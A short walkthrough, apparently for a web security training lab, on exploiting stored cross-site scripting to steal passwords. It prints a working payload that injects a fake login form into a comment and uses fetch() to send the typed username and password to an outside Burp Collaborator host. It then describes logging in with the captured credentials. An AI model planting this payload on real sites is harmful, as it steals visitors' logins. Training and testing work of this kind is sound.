Exploiting cross-site scripting to capture passwords

Our second go with Burp Collaborator. We'll generate a login form in the comment and use Collaborator to pick up the request:

Script:

<input name=username id=username>
<input type=password name=password onchange="if(10 > 9)fetch('https://shd1j4fe5bj5bvql9z0ke38ba2gt4i.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});"> 

The provided solution uses onchange="if(this.value.length), but you can use anything that resolves to True

Inputting the script in a comment will generate a login form. Check your Collaborator and you'll see a HTTP request with login details. It should look like this:

POST / HTTP/1.1

Log in with your newly acquired credentials and you should get the lab solved prompt.
